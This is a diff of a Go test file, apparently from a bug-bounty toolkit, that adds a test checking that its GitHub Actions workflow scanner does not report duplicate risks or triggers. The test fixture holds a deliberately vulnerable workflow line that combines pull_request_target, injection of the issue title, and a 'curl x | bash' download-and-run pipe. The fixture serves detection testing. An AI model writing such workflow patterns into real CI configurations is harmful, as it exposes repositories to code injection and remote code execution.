@@ -45,6 +45,41 @@ func TestListOrgReposAndFilter(t *testing.T) {
 	}
 }
 
+func TestScanRepoDeduplicatesRisks(t *testing.T) {
+	dir := t.TempDir()
+	wf := filepath.Join(dir, ".github", "workflows")
+	if err := os.MkdirAll(wf, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	body := []byte("on: pull_request_target\nrun: echo ${{ github.event.issue.title }} | curl x | bash\n")
+	for _, n := range []string{"a.yml", "b.yml"} {
+		if err := os.WriteFile(filepath.Join(wf, n), body, 0o600); err != nil {
+			t.Fatal(err)
+		}
+	}
+	r := &Repo{Slug: "org-repo", Path: dir}
+	scanRepo(r, func(string, ...any) {})
+	if len(r.Workflows) != 2 {
+		t.Fatalf("workflows = %d", len(r.Workflows))
+	}
+	seen := map[string]bool{}
+	for _, x := range r.Risks {
+		if seen[x] {
+			t.Errorf("duplicate risk: %s", x)
+		}
+		seen[x] = true
+	}
+	for _, w := range r.Workflows {
+		trig := map[string]bool{}
+		for _, x := range w.Triggers {
+			if trig[x] {
+				t.Errorf("duplicate trigger in %s: %s", w.File, x)
+			}
+			trig[x] = true
+		}
+	}
+}
+
 func TestAnalyzeExpandsOrgURL(t *testing.T) {
 	t.Setenv("BOUNTYKIT_HOME", t.TempDir())
 	p, err := workspace.Create("demo", workspace.Meta{})
